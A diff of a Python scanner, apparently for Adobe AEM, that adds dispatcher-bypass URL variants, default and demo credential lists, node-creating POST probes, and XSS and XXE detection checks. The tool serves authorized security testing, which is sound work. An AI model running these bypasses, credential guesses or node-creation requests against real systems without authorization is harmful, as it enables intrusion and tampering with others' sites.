@@ -18,14 +18,17 @@ import requests
 requests.packages.urllib3.disable_warnings()
 
 
-CREDS = (
-    'admin:admin',
-    'author:author',
-    'replication-receiver:replication-receiver',
-    'vgnadmin:vgnadmin',
-    'aparker@geometrixx.info:aparker',
-    'jdoe@geometrixx.info:jdoe'
-)
+CREDS = ('admin:admin',
+         'author:author',
+         'grios:password',
+         'replication-receiver:replication-receiver',
+         'vgnadmin:vgnadmin',
+         'aparker@geometrixx.info:aparker',
+         'jdoe@geometrixx.info:jdoe',
+         'james.devore@spambob.com:password',
+         'matt.monroe@mailinator.com:password',
+         'aaron.mcdonald@mailinator.com:password',
+         'jason.werner@dodgit.com:password')
 
 
 def random_string(length=10):
@@ -175,12 +178,82 @@ def preflight(url, proxy=None, debug=False):
 
 
 @register
+def exposed_set_preferences(base_url, my_host, debug=False, proxy=None):
+    r = random_string(3)
+
+    MERGEMETADATA = itertools.product(('/crx/de/setPreferences.jsp', '///crx///de///setPreferences.jsp'),
+                                   (';%0a{0}.html', '/{0}.html'),
+                                   ('?keymap=<1337>&language=0',))
+    MERGEMETADATA = list('{0}{1}{2}'.format(p1, p2.format(r), p3) for p1, p2, p3 in MERGEMETADATA)
+
+    results = []
+
+    for path in MERGEMETADATA:
+        url = normalize_url(base_url, path)
+
+        try:
+            resp = http_request(url, proxy=proxy)
+
+            if resp.status_code == 400:
+                if '<1337>' in resp.content.decode():
+                    f = Finding('SetPreferences', url,
+                                'Page setPreferences.jsp is exposed, XSS might be possible via keymap parameter.')
+
+                    results.append(f)
+                    break
+        except:
+            if debug:
+                error('Exception while performing a check', check='exposed_set_preferences', url=url)
+
+    return results
+
+
+@register
+def exposed_merge_metadata(base_url, my_host, debug=False, proxy=None):
+    r = random_string(3)
+
+    MERGEMETADATA = itertools.product(('/libs/dam/merge/metadata', '///libs///dam///merge///metadata'),
+                                   ('.html', '.css/{0}.html', '.ico/{0}.html', '....4.2.1....json/{0}.html',
+                                    '.css;%0a{0}.html', '.ico;%0a{0}.html'),
+                                   ('?path=/etc&.ico',))
+    MERGEMETADATA = list('{0}{1}{2}'.format(p1, p2.format(r), p3) for p1, p2, p3 in MERGEMETADATA)
+
+    results = []
+
+    for path in MERGEMETADATA:
+        url = normalize_url(base_url, path)
+
+        try:
+            resp = http_request(url, proxy=proxy)
+
+            if resp.status_code == 200:
+                try:
+                    json.loads(resp.content.decode())['assetPaths']
+                except:
+                    pass
+                else:
+                    f = Finding('MergeMetadataServlet', url,
+                                'MergeMetadataServlet is exposed, XSS might be possible via path parameter.')
+
+                    results.append(f)
+                    break
+        except:
+            if debug:
+                error('Exception while performing a check', check='exposed_merge_metadata', url=url)
+
+    return results
+
+
+@register
 def exposed_get_servlet(base_url, my_host, debug=False, proxy=None):
-    GETSERVLET = itertools.product(('/etc', '/var', '/apps', '/home', '///etc', '///var', '///apps', '///home'),
-                                   ('.json', '.1.json', '.4.2.1....json', '.json/a.css', '.json.html', '.json.css',
-                                    '.json/a.html', '.json/a.png', '.json/a.ico', '.json/b.jpeg', '.json/b.gif',
-                                    '.json;%0aa.css', '.json;%0aa.png', '.json;%0aa.html', '.json;%0aa.js', '.json/a.js'))
-    GETSERVLET = list('{0}{1}'.format(p1, p2) for p1, p2 in GETSERVLET)
+    r = random_string(3)
+
+    GETSERVLET = itertools.product(('/', '/etc', '/var', '/apps', '/home', '///etc', '///var', '///apps', '///home'),
+                                   ('', '.children'),
+                                   ('.json', '.1.json', '....4.2.1....json', '.json?{0}.css', '.json?{0}.ico', '.json?{0}.html',
+                                   '.json/{0}.css', '.json/{0}.html', '.json/{0}.png', '.json/{0}.ico',
+                                   '.json;%0a{0}.css', '.json;%0a{0}.png', '.json;%0a{0}.html', '.json;%0a{0}.ico'))
+    GETSERVLET = list('{0}{1}{2}'.format(p1, p2, p3.format(r)) for p1, p2, p3 in GETSERVLET)
 
     results = []
 
@@ -188,11 +261,13 @@ def exposed_get_servlet(base_url, my_host, debug=False, proxy=None):
         url = normalize_url(base_url, path)
 
         try:
-            resp = http_request(url, proxy=proxy, debug=debug)
+            resp = http_request(url, proxy=proxy)
 
             if resp.status_code == 200:
                 try:
-                    json.loads(resp.content.decode())['jcr:primaryType']
+                    json.loads(resp.content.decode())
+                    if not 'jcr:primaryType' in resp.content.decode():
+                        raise Exception()
                 except:
                     pass
                 else:
@@ -211,14 +286,13 @@ def exposed_get_servlet(base_url, my_host, debug=False, proxy=None):
 
 @register
 def exposed_querybuilder_servlet(base_url, my_host, debug=False, proxy=None):
-    QUERYBUILDER = itertools.product(('/bin/querybuilder.json', '/bin/querybuilder.json.servlet',
-                                      '///bin///querybuilder.json', '///bin///querybuilder.json.servlet',
-                                      '/bin/querybuilder.feed', '/bin/querybuilder.feed.servlet',
-                                      '///bin///querybuilder.feed', '///bin///querybuilder.feed.servlet'),
-                                     ('', '.css', '.ico', '.png', '.gif', '.jpeg', '.html', '.1.json', '.4.2.1...json',
-                                      '/a.css', '/a.html', '/a.ico', '/a.png' '/a.js', '/a.1.json', '/a.4.2.1...json',
-                                      ';%0aa.css', ';%0aa.png', ';%0aa.js', ';%0aa.html', ';%0aa.ico'))
-    QUERYBUILDER = list('{0}{1}'.format(p1, p2) for p1, p2 in QUERYBUILDER)
+    r = random_string(3)
+
+    QUERYBUILDER = itertools.product(('/bin/querybuilder.json', '///bin///querybuilder.json', '/bin/querybuilder.feed', '///bin///querybuilder.feed'),
+                                     ('', '.css', '.ico', '.png', '.gif', '.html', '.1.json', '....4.2.1....json',
+                                      ';%0a{0}.css', ';%0a{0}.png', ';%0a{0}.html', ';%0a{0}.ico', '.ico;%0a{0}.ico',
+                                      '.css;%0a{0}.css', '.html;%0a{0}.html', '?{0}.css', '?{0}.ico'))
+    QUERYBUILDER = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in QUERYBUILDER)
 
     results = []
     found_json = False
@@ -229,7 +303,7 @@ def exposed_querybuilder_servlet(base_url, my_host, debug=False, proxy=None):
 
         url = normalize_url(base_url, path)
         try:
-            resp = http_request(url, proxy=proxy, debug=debug)
+            resp = http_request(url, proxy=proxy)
 
             if resp.status_code == 200:
                 try:
@@ -266,42 +340,19 @@ def exposed_querybuilder_servlet(base_url, my_host, debug=False, proxy=None):
 
 @register
 def exposed_gql_servlet(base_url, my_host, debug=False, proxy=None):
-    GQLSERVLET = (
-        '/bin/wcm/search/gql.servlet.json?query=type:base%20limit:..1&pathPrefix=',
-        '/bin/wcm/search/gql.json?query=type:base%20limit:..1&pathPrefix=',
-        '/bin/wcm/search/gql.json/a.1.json?query=type:base%20limit:..1&pathPrefix=',
-        '/bin/wcm/search/gql.json/a.4.2.1...json?query=type:base%20limit:..1&pathPrefix=',
-        '/bin/wcm/search/gql.json;%0aa.css?query=type:base%20limit:..1&pathPrefix=',
-        '/bin/wcm/search/gql.json;%0aa.html?query=type:base%20limit:..1&pathPrefix=',
-        '/bin/wcm/search/gql.json;%0aa.js?query=type:base%20limit:..1&pathPrefix=',
-        '/bin/wcm/search/gql.json;%0aa.png?query=type:base%20limit:..1&pathPrefix=',
-        '/bin/wcm/search/gql.json;%0aa.ico?query=type:base%20limit:..1&pathPrefix=',
-        '/bin/wcm/search/gql.json/a.css?query=type:base%20limit:..1&pathPrefix=',
-        '/bin/wcm/search/gql.json/a.js?query=type:base%20limit:..1&pathPrefix=',
-        '/bin/wcm/search/gql.json/a.ico?query=type:base%20limit:..1&pathPrefix=',
-        '/bin/wcm/search/gql.json/a.png?query=type:base%20limit:..1&pathPrefix=',
-        '/bin/wcm/search/gql.json/a.html?query=type:base%20limit:..1&pathPrefix=',
-        '///bin///wcm///search///gql.servlet.json?query=type:base%20limit:..1&pathPrefix=',
-        '///bin///wcm///search///gql.json?query=type:base%20limit:..1&pathPrefix=',
-        '///bin///wcm///search///gql.json///a.1.json?query=type:base%20limit:..1&pathPrefix=',
-        '///bin///wcm///search///gql.json///a.4.2.1...json?query=type:base%20limit:..1&pathPrefix=',
-        '///bin///wcm///search///gql.json;%0aa.css?query=type:base%20limit:..1&pathPrefix=',
-        '///bin///wcm///search///gql.json;%0aa.js?query=type:base%20limit:..1&pathPrefix=',
-        '///bin///wcm///search///gql.json;%0aa.html?query=type:base%20limit:..1&pathPrefix=',
-        '///bin///wcm///search///gql.json;%0aa.png?query=type:base%20limit:..1&pathPrefix=',
-        '///bin///wcm///search///gql.json;%0aa.ico?query=type:base%20limit:..1&pathPrefix=',
-        '///bin///wcm///search///gql.json///a.css?query=type:base%20limit:..1&pathPrefix=',
-        '///bin///wcm///search///gql.json///a.ico?query=type:base%20limit:..1&pathPrefix=',
-        '///bin///wcm///search///gql.json///a.png?query=type:base%20limit:..1&pathPrefix=',
-        '///bin///wcm///search///gql.json///a.js?query=type:base%20limit:..1&pathPrefix=',
-        '///bin///wcm///search///gql.json///a.html?query=type:base%20limit:..1&pathPrefix='
-    )
+    r = random_string(3)
+
+    GQLSERVLET = itertools.product(('/bin/wcm/search/gql', '///bin///wcm///search///gql'),
+                  ('.json', '....1....json', '.json/{0}.css', '.json/{0}.html', '.json/{0}.ico', '.json/{0}.png',
+                   '.json;%0a{0}.css', '.json;%0a{0}.ico', '.json;%0a{0}.html', '.json;%0a{0}.png'),
+                  ('?query=type:User%20limit:..1&pathPrefix=&p.ico',))
+    GQLSERVLET = list('{0}{1}{2}'.format(p1, p2.format(r), p3) for p1, p2, p3 in GQLSERVLET)
 
     results = []
     for path in GQLSERVLET:
         url = normalize_url(base_url, path)
         try:
-            resp = http_request(url, proxy=proxy, debug=debug)
+            resp = http_request(url, proxy=proxy)
 
             if resp.status_code == 200:
                 try:
@@ -323,12 +374,71 @@ def exposed_gql_servlet(base_url, my_host, debug=False, proxy=None):
 
 
 @register
+def exposed_guide_internal_submit_servlet_xxe(base_url, my_host, debug=False, proxy=None):
+    r = random_string(3)
+
+    GuideInternalSubmitServlet = itertools.product(('/content/forms/af/geometrixx-gov/application-for-assistance/jcr:content/guideContainer',
+                                                    '/content/forms/af/geometrixx-gov/geometrixx-survey-form/jcr:content/guideContainer',
+                                                    '/content/forms/af/geometrixx-gov/hardship-determination/jcr:content/guideContainer',
+                                                    '/libs/fd/af/components/guideContainer/cq:template',
+                                                    '///libs///fd///af///components///guideContainer///cq:template',
+                                                    '/libs/fd/af/templates/simpleEnrollmentTemplate2/jcr:content/guideContainer',
+                                                    '///libs///fd///af///templates///simpleEnrollmentTemplate2///jcr:content///guideContainer',
+                                                    '/libs/fd/af/templates/surveyTemplate2/jcr:content/guideContainer',
+                                                    '///libs///fd///af///templates///surveyTemplate2///jcr:content///guideContainer',
+                                                    '/libs/fd/af/templates/blankTemplate2/jcr:content/guideContainer',
+                                                    '///libs///fd///af///templates///blankTemplate2///jcr:content///guideContainer',
+                                                    '/libs/fd/af/templates/surveyTemplate/jcr:content/guideContainer',
+                                                    '/libs/fd/af/templates/surveyTemplate/jcr:content/guideContainer',
+                                                    '///libs///fd///af///templates///surveyTemplate///jcr:content///guideContainer',
+                                                    '/libs/fd/af/templates/tabbedEnrollmentTemplate/jcr:content/guideContainer',
+                                                    '///libs///fd///af///templates///tabbedEnrollmentTemplate///jcr:content///guideContainer',
+                                                    '/libs/fd/af/templates/tabbedEnrollmentTemplate2/jcr:content/guideContainer',
+                                                    '///libs///fd///af///templates///tabbedEnrollmentTemplate2///jcr:content///guideContainer',
+                                                    '/libs/fd/af/templates/simpleEnrollmentTemplate/jcr:content/guideContainer',
+                                                    '///libs///fd///af///templates///simpleEnrollmentTemplate///jcr:content///guideContainer',
+                                                    '/libs/settings/wcm/template-types/afpage/initial/jcr:content/guideContainer',
+                                                    '///libs///settings///wcm///template-types///afpage///initial///jcr:content///guideContainer',
+                                                    '/libs/settings/wcm/template-types/afpage/structure/jcr:content/guideContainer',
+                                                    '///libs///settings///wcm///template-types///afpage///structure///jcr:content///guideContainer',
+                                                    '/apps/geometrixx-gov/templates/enrollment-template/jcr:content/guideContainer',
+                                                    '/apps/geometrixx-gov/templates/survey-template/jcr:content/guideContainer',
+                                                    '/apps/geometrixx-gov/templates/tabbed-enrollment-template/jcr:content/guideContainer'),
+                                                    ('.af.internalsubmit.json', '.af.internalsubmit.1.json', '.af.internalsubmit...1...json',
+                                                     '.af.internalsubmit.html', '.af.internalsubmit.js', '.af.internalsubmit.css',
+                                                     '.af.internalsubmit.ico', '.af.internalsubmit.png', '.af.internalsubmit.gif',
+                                                     '.af.internalsubmit.svg', '.af.internalsubmit.ico;%0a{0}.ico',
+                                                     '.af.internalsubmit.html;%0a{0}.html', '.af.internalsubmit.css;%0a{0}.css'))
+    GuideInternalSubmitServlet = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in GuideInternalSubmitServlet)
+
+    results = []
+    for path in GuideInternalSubmitServlet:
+        url = normalize_url(base_url, path)
+        try:
+            data = 'guideState={"guideState"%3a{"guideDom"%3a{},"guideContext"%3a{"xsdRef"%3a"","guidePrefillXml"%3a"<afData>\u0041\u0042\u0043</afData>"}}}'
+            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url}
+            resp = http_request(url, 'POST', data=data, additional_headers=headers, proxy=proxy)
+
+            if resp.status_code == 200 and '<afData>ABC' in str(resp.content):
+                f = Finding('GuideInternalSubmitServlet', url,
+                            'GuideInternalSubmitServlet is exposed, XXE is possible.')
+                results.append(f)
+                break
+        except:
+            if debug:
+                error('Exception while performing a check', check='exposed_guide_internal_submit_servlet_xxe', url=url)
+
+    return results
+
+
+@register
 def exposed_post_servlet(base_url, my_host, debug=False, proxy=None):
+    r = random_string(3)
+
     POSTSERVLET = itertools.product(('/', '/content', '/content/dam'),
-                                    ('.json', '.1.json', '.json/a.css', '.json/a.html', '.json/a.ico', '.json/a.png',
-                                     '.json/a.gif', '.json/a.1.json', '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.js',
-                                     '.json;%0aa.png', '.json;%0aa.ico', '.4.2.1...json'))
-    POSTSERVLET = list('{0}{1}'.format(p1, p2) for p1, p2 in POSTSERVLET)
+                                    ('.json', '.1.json', '...4.2.1...json', '.json/{0}.css', '.json/{0}.html',
+                                     '.json;%0a{0}.css', '.json;%0a{0}.html'))
+    POSTSERVLET = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in POSTSERVLET)
 
     results = []
     for path in POSTSERVLET:
@@ -354,25 +464,38 @@ def exposed_post_servlet(base_url, my_host, debug=False, proxy=None):
 def create_new_nodes(base_url, my_host, debug=False, proxy=None):
     CREDS = ('admin:admin', 'author:author')
 
-    POSTSERVLET = itertools.product(('/content/test', '/content/*', '/content/usergenerated/test', '/content/usergenerated/*',
-                                     '/content/usergenerated/etc/commerce/smartlists/test', '/content/usergenerated/etc/commerce/smartlists/*',
-                                     '/apps/test', '/apps/*'),
-                                    ('.json', '.1.json', '.json/a.css', '.json/a.html', '.json/a.ico', '.json/a.png',
-                                     '.json/a.gif', '.json/a.1.json', '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.js',
-                                     '.json;%0aa.png', '.json;%0aa.ico', '.4.2.1...json'))
-    POSTSERVLET = list('{0}{1}'.format(p1, p2) for p1, p2 in POSTSERVLET)
+    nodename1 = random_string()
+    r1 = random_string(3)
+    POSTSERVLET1 = itertools.product(('/content/usergenerated/etc/commerce/smartlists/', '/content/usergenerated/'),
+                                    ('*', '{0}.json', '{0}.1.json', '{0}.json/{1}.css', '{0}.json/{1}.html',
+                                     '{0}.json/{1}.ico', '{0}.json/{1}.png', '{0}.json/{1}.1.json',
+                                     '{0}.json;%0a{1}.css', '{0}.json;%0a{1}.html', '{0}.json;%0a{1}.png',
+                                     '{0}.json;%0a{1}.ico', '{0}....4.2.1....json', '{0}?{1}.ico',
+                                     '{0}?{1}.css', '{0}?{1}.html', '{0}?{1}.json', '{0}?{1}.1.json',
+                                     '{0}?{1}....4.2.1....json'))
+    POSTSERVLET1 = list('{0}{1}'.format(p1, p2.format(nodename1, r1)) for p1, p2 in POSTSERVLET1)
+
+    nodename2 = random_string()
+    r2 = random_string(3)
+    POSTSERVLET2 = itertools.product(('/', '/content/', '/apps/', '/libs/'),
+                                    ('*', '{0}.json', '{0}.1.json', '{0}.json/{1}.css',
+                                     '{0}.json/{1}.html', '{0}.json/{1}.ico', '{0}.json/{1}.png',
+                                     '{0}.json/{1}.1.json', '{0}.json;%0a{1}.css', '{0}.json;%0a{1}.html',
+                                     '{0}.json;%0a{1}.png', '{0}.json;%0a{1}.ico', '{0}....4.2.1....json',
+                                     '{0}?{1}.ico', '{0}?{1}.css', '{0}?{1}.html', '{0}?{1}.json',
+                                     '{0}?{1}.1.json', '{0}?{1}....4.2.1....json'))
+    POSTSERVLET2 = list('{0}{1}'.format(p1, p2.format(nodename2, r2)) for p1, p2 in POSTSERVLET2)
 
     results = []
-    for path in POSTSERVLET:
+    for path in POSTSERVLET1:
         url = normalize_url(base_url, path)
         try:
-            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url, 'User-Agent':'curl/7.30.0'}
-            resp = http_request(url, 'POST', additional_headers=headers, proxy=proxy, debug=debug)
-
-            if resp.status_code == 200 and '<td>Parent Location</td>' in str(resp.content):
+            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url}
+            resp = http_request(url, 'POST', additional_headers=headers, proxy=proxy)
+            if '<td>Parent Location</td>' in str(resp.content) and resp.status_code in [200, 201]:
                 f = Finding('CreateJCRNodes', url,
-                            'It\'s possible to create new JCR nodes using POST Servlet. As anonymous user. '
-                            'You might get persistent XSS.')
+                            'It\'s possible to create new JCR nodes using POST Servlet as anonymous user. '
+                            'You might get persistent XSS or perform other attack by accessing servlets registered by Resource Type.')
                 results.append(f)
                 break
         except:
@@ -380,14 +503,15 @@ def create_new_nodes(base_url, my_host, debug=False, proxy=None):
                 error('Exception while performing a check', check='create_new_nodes', url=url)
 
 
-    for path, creds in itertools.product(POSTSERVLET, CREDS):
+    for path, creds in itertools.product(POSTSERVLET2, CREDS):
         url = normalize_url(base_url, path)
         try:
             headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url,
                        'Authorization': 'Basic {}'.format(base64.b64encode(creds.encode()).decode())}
-            resp = http_request(url, 'POST', additional_headers=headers, proxy=proxy, debug=debug)
+            data = 'a=b'
+            resp = http_request(url, 'POST', data=data, additional_headers=headers, proxy=proxy)
 
-            if resp.status_code == 200 and '<td>Parent Location</td>' in str(resp.content):
+            if '<td>Parent Location</td>' in str(resp.content) and resp.status_code in [200, 201]:
                 f = Finding('CreateJCRNodes', url,
                             'It\'s possible to create new JCR nodes using POST Servlet as "{0}" user. '
                             'You might get persistent XSS or RCE.'.format(creds))
@@ -401,12 +525,56 @@ def create_new_nodes(base_url, my_host, debug=False, proxy=None):
 
 
 @register
+def create_new_nodes2(base_url, my_host, debug=False, proxy=None):
+    CREDS = ('author:author', 'grios:password', 'aparker@geometrixx.info:aparker', 'jdoe@geometrixx.info:jdoe',
+             'james.devore@spambob.com:password', 'matt.monroe@mailinator.com:password',
+             'aaron.mcdonald@mailinator.com:password', 'jason.werner@dodgit.com:password')
+
+    nodename = random_string()
+    r = random_string(3)
+    POSTSERVLET = itertools.product(('/home/users/geometrixx/{0}/', ),
+                                    ('*', '{0}.json', '{0}.1.json', '{0}.json/{1}.css',
+                                     '{0}.json/{1}.html', '{0}.json/{1}.ico', '{0}.json/{1}.png',
+                                     '{0}.json/{1}.1.json', '{0}.json;%0a{1}.css', '{0}.json;%0a{1}.html',
+                                     '{0}.json;%0a{1}.png', '{0}.json;%0a{1}.ico',
+                                     '{0}....4.2.1....json', '{0}?{1}.ico', '{0}?{1}.css',
+                                     '{0}?{1}.html', '{0}?{1}.json', '{0}?{1}.1.json',
+                                     '{0}?{1}....4.2.1....json'))
+    POSTSERVLET = list('{0}{1}'.format(p1, p2.format(nodename, r)) for p1, p2 in POSTSERVLET)
+
+    results = []
+    for path, creds in itertools.product(POSTSERVLET, CREDS):
+        path = path.format(creds.split(':')[0])
+        url = normalize_url(base_url, path)
+        try:
+            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url,
+                       'Authorization': 'Basic {}'.format(base64.b64encode(creds.encode()).decode())}
+            data = 'a=b'
+            resp = http_request(url, 'POST', data=data, additional_headers=headers, proxy=proxy)
+
+            if '<td>Parent Location</td>' in str(resp.content) and resp.status_code in [200, 201]:
+                f = Finding('CreateJCRNodes 2', url,
+                            'It\'s possible to create new JCR nodes using POST Servlet. As Geometrixx user "{0}". '
+                            'You might get persistent XSS or perform other attack by accessing servlets registered by Resource Type.'.format(creds))
+                results.append(f)
+                break
+        except:
+            if debug:
+                error('Exception while performing a check', check='create_new_nodes2', url=url)
+
+    return results
+
+
+@register
 def exposed_loginstatus_servlet(base_url, my_host, debug=False, proxy=None):
+    global CREDS
+
+    r = random_string(3)
     LOGINSTATUS = itertools.product(('/system/sling/loginstatus', '///system///sling///loginstatus'),
-                                    ('.json', '.css', '.ico', '.png', '.gif', '.html', '.js', '.json/a.1.json',
-                                     '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.js', '.json;%0aa.png',
-                                     '.json;%0aa.ico', '.4.2.1...json'))
-    LOGINSTATUS = list('{0}{1}'.format(p1, p2) for p1, p2 in LOGINSTATUS)
+                                    ('.json', '.css', '.ico', '.png', '.gif', '.html', '.js', '.json/{0}.1.json',
+                                     '.json;%0a{0}.css', '.json;%0a{0}.html', '.json;%0a{0}.png',
+                                     '.json;%0a{0}.ico', '...4.2.1...json'))
+    LOGINSTATUS = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in LOGINSTATUS)
 
     results = []
     for path in LOGINSTATUS:
@@ -437,13 +605,16 @@ def exposed_loginstatus_servlet(base_url, my_host, debug=False, proxy=None):
     return results
 
 
-@register
+#@register
 def exposed_currentuser_servlet(base_url, my_host, debug=False, proxy=None):
+    global CREDS
+
+    r = random_string(3)
     CURRENTUSER = itertools.product(('/libs/granite/security/currentuser', '///libs///granite///security///currentuser'),
-                                    ('.json', '.css', '.ico', '.png', '.gif', '.html', '.js', '.json?a.css', '.json/a.1.json',
-                                     '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.js', '.json;%0aa.png',
-                                     '.json;%0aa.ico', '.4.2.1...json'))
-    CURRENTUSER = list('{0}{1}'.format(p1, p2) for p1, p2 in CURRENTUSER)
+                                    ('.json', '.css', '.ico', '.png', '.gif', '.html', '.js', '.json?{0}.css',
+                                     '.json/{0}.1.json', '.json;%0a{0}.css', '.json;%0a{0}.html', '.json;%0a{0}.js',
+                                     '.json;%0a{0}.ico', '...4.2.1...json'))
+    CURRENTUSER = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in CURRENTUSER)
 
     results = []
     for path in CURRENTUSER:
@@ -476,12 +647,16 @@ def exposed_currentuser_servlet(base_url, my_host, debug=False, proxy=None):
 
 @register
 def exposed_userinfo_servlet(base_url, my_host, debug=False, proxy=None):
-    USERINFO = itertools.product(('/libs/cq/security/userinfo', '///libs///cq///security///userinfo'),
-                                    ('.json', '.css', '.ico', '.png', '.gif', '.html', '.js', '.json?a.css', '.json/a.1.json',
-                                     '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.js', '.json;%0aa.png',
-                                     '.json;%0aa.ico', '.4.2.1...json'))
+    global CREDS
 
-    USERINFO = list('{0}{1}'.format(p1, p2) for p1, p2 in USERINFO)
+    r = random_string(3)
+    USERINFO = itertools.product(('/libs/cq/security/userinfo', '///libs///cq///security///userinfo'),
+                                    ('.json', '.css', '.ico', '.png', '.gif', '.html', '.js',
+                                     '.json?{0}.css', '.json/{0}.1.json',
+                                     '.json;%0a{0}.css', '.json;%0a{0}.html',
+                                     '.json;%0a{0}.ico', '...4.2.1...json'))
+
+    USERINFO = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in USERINFO)
 
     results = []
     for path in USERINFO:
@@ -514,11 +689,13 @@ def exposed_userinfo_servlet(base_url, my_host, debug=False, proxy=None):
 
 @register
 def exposed_felix_console(base_url, my_host, debug=False, proxy=None):
+    r = random_string(3)
+
     FELIXCONSOLE = itertools.product(('/system/console/bundles', '///system///console///bundles'),
                                     ('', '.json', '.1.json', '.4.2.1...json', '.css', '.ico', '.png', '.gif', '.html', '.js',
-                                     ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.png', '.json;%0aa.ico', '.servlet/a.css',
-                                     '.servlet/a.js', '.servlet/a.html', '.servlet/a.ico', '.servlet/a.png'))
-    FELIXCONSOLE = list('{0}{1}'.format(p1, p2) for p1, p2 in FELIXCONSOLE)
+                                     ';%0a{0}.css', ';%0a{0}.html', ';%0a{0}.png', '.json;%0a{0}.ico', '.servlet/{0}.css',
+                                     '.servlet/{0}.js', '.servlet/{0}.html', '.servlet/{0}.ico'))
+    FELIXCONSOLE = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in FELIXCONSOLE)
 
     results = []
     for path in FELIXCONSOLE:
@@ -543,12 +720,13 @@ def exposed_felix_console(base_url, my_host, debug=False, proxy=None):
 
 @register
 def exposed_wcmdebug_filter(base_url, my_host, debug=False, proxy=None):
+    r = random_string(3)
+
     WCMDEBUG = itertools.product(('/', '/content', '/content/dam'),
-                                 ('.json', '.1.json', '.json.html', '.json.css', '.json.js', '.4.2.1...json', '.json/a.css',
-                                  '.json/a.html', '.json/a.png', '.json/a.ico', '.json/a.js', '.json/b.gif', '.json%0aa.css',
-                                  '.json%0aa.html', '.json%0aa.png', '.json%0aa.ico'),
+                                 ('.json', '.1.json', '...4.2.1...json', '.json/{0}.css',
+                                  '.json/{0}.html', '.json/{0}.ico', '.json;%0a{0}.css', '.json;%0a{0}.html', '.json;%0a{0}.ico'),
                                  ('?debug=layout',))
-    WCMDEBUG = list('{0}{1}{2}'.format(p1, p2, p3) for p1, p2, p3 in WCMDEBUG)
+    WCMDEBUG = list('{0}{1}{2}'.format(p1, p2.format(r), p3) for p1, p2, p3 in WCMDEBUG)
 
     results = []
     for path in WCMDEBUG:
@@ -572,13 +750,14 @@ def exposed_wcmdebug_filter(base_url, my_host, debug=False, proxy=None):
 
 @register
 def exposed_wcmsuggestions_servlet(base_url, my_host, debug=False, proxy=None):
-    WCMSUGGESTIONS = itertools.product(
-        ('/bin/wcm/contentfinder/connector/suggestions', '///bin///wcm///contentfinder///connector///suggestions'),
-        ('.json', '.css', '.html', '.ico', '.png', '.gif', '.json/a.1.json', '.json;%0aa.css', '.json/a.css',
-         '.json/a.png', '.json/a.html', '.4.2.1...json'),
-        ('?query_term=path%3a/&pre=<1337abcdef>&post=yyyy',)
-    )
-    WCMSUGGESTIONS = list('{0}{1}{2}'.format(p1, p2, p3) for p1, p2, p3 in WCMSUGGESTIONS)
+    r = random_string(3)
+
+    WCMSUGGESTIONS = itertools.product(('/bin/wcm/contentfinder/connector/suggestions', '///bin///wcm///contentfinder///connector///suggestions'),
+                                       ('.json', '.css', '.html', '.ico', '.png', '.gif', '.json/{0}.1.json',
+                                        '.json;%0a{0}.css', '.json/{0}.css', '.json/{0}.ico',
+                                        '.json/{0}.html', '...4.2.1...json'),
+                                       ('?query_term=path%3a/&pre=<1337abcdef>&post=yyyy',))
+    WCMSUGGESTIONS = list('{0}{1}{2}'.format(p1, p2.format(r), p3) for p1, p2, p3 in WCMSUGGESTIONS)
 
     results = []
     for path in WCMSUGGESTIONS:
@@ -601,97 +780,36 @@ def exposed_wcmsuggestions_servlet(base_url, my_host, debug=False, proxy=None):
 
 
 @register
-def exposed_auditlog_servlet(base_url, my_host, debug=False, proxy=None):
-    AUDITLOG = itertools.product(('/bin/msm/audit', '///bin///msm///audit'),
-                                 ('.json', '.css', '.html', '.ico', '.png', '.gif', '.json/a.1.json', '.json;%0aa.css',
-                                  '.4.2.1...json', '.json/a.css', '.json/a.html', '.json/a.png', '.json;%0aa.html'))
-    AUDITLOG = list('{0}{1}'.format(p1, p2) for p1, p2 in AUDITLOG)
-
-    results = []
-    for path in AUDITLOG:
-        url = normalize_url(base_url, path)
-        try:
-            resp = http_request(url, proxy=proxy, debug=debug)
-
-            if resp.status_code == 200:
-                try:
-                    count = int(json.loads(resp.content.decode())['results'])
-                except:
-                    pass
-                else:
-                    if count != 0:
-                        f = Finding('AuditLogServlet', url,
-                                    'AuditLogServlet is vulnerable and exposing audit log records.')
-
-                        results.append(f)
-                        break
-        except:
-            if debug:
-                error('Exception while performing a check', check='exposed_auditlog_servlet', url=url)
-
-    return results
-
-
-@register
-def exposed_crxde_logs(base_url, my_host, debug=False, proxy=None):
-    CRXDELOGS = itertools.product(
-        ('/bin/crxde/logs{0}?tail=100', '///bin///crxde///logs{0}?tail=100'),
-        ('', '.json', '.1.json', '.4.2.1...json', '.html', ';%0aa.css', ';%0aa.html', ';%0aa.js',
-         ';%0aa.ico', ';%0aa.png', '/a.css', '/a.html', '/a.png', '/a.js', '/a.ico')
-    )
-    CRXDELOGS = list(p1.format(p2) for p1, p2 in CRXDELOGS)
-
-    results = []
-    for path in CRXDELOGS:
-        url = normalize_url(base_url, path)
-        try:
-            resp = http_request(url, proxy=proxy, debug=debug)
-
-            if resp.status_code == 200 and ('*WARN*' in str(resp.content) or '*INFO*' in str(resp.content)):
-
-                f = Finding('CRXDE logs', url, 'CRXDE logs are exposed.')
-
-                results.append(f)
-                break
-        except:
-            if debug:
-                error('Exception while performing a check', check='exposed_crxde_logs', url=url)
-
-    return results
-
-
-@register
 def exposed_crxde_crx(base_url, my_host, debug=False, proxy=None):
-    CRXDELITE = itertools.product(
-        ('/crx/de/index.jsp', '///crx///de///index.jsp'),
-        ('', ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.ico', ';%0aa.png', '?a.css', '?a.html', '?a.png', '?a.js', '?a.ico')
